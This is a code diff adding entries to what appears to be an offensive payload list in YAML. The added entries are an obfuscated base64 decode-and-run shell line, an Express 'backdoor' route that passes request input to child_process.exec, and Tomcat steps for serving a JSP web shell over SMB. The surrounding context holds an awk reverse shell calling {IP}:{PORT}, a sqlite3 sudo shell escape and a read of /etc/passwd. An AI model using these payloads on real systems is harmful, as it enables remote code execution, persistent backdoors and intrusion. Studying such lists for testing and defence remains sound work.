@@ -75,6 +75,8 @@ payload:
     - |
       echo {BASE64_URLENCODE} | base64 -d | bash
     - |
+      echo${IFS}{BASE64}|base64${IFS}-d|bash
+    - |
       echo+{BASE64_URLENCODE}+|+base64+-d+|+bash
     - |
       echo '{BASE64_PY3}' | base64 -d | bash
@@ -444,7 +446,20 @@ payload:
 
       require('fs').readFileSync("/etc/passwd").toString('utf8')
 
+      # require("child_process").exec()
       {NODE_BASE64}
+
+      # Backdoor (curl localhost:3000/download?q=whoami)
+      app.get('/download', (req, res) => {
+          var url = req.query.q;
+          require("child_process").exec(url, (error, stdout, stderr) => {
+            if (error) {
+              res.send(`exec error: ${error}`);
+              return;
+            }
+            res.send(`stdout: ${stdout}`);
+          });
+      });
   awk:
     - |
       awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
@@ -1678,4 +1693,14 @@ payload:
   sqlite3:
     - |
       sudo sqlite3 /dev/null ".shell echo '{BASE64_PY3}' | base64 -d | bash"
+  tomcat:
+    - |
+      # Host-Manager
+      Name: test
+      ALiases: test
+      App base \\{IP}\data\
+
+      => sudo smbserver.py -smb2support -debug -comment "test" data /pathto/data-smbserver
+      => copy shell.jsp (rename shell.war) to /pathto/data-smbserver/.
+      => access http://10.10.10.10/shell.jsp
 """
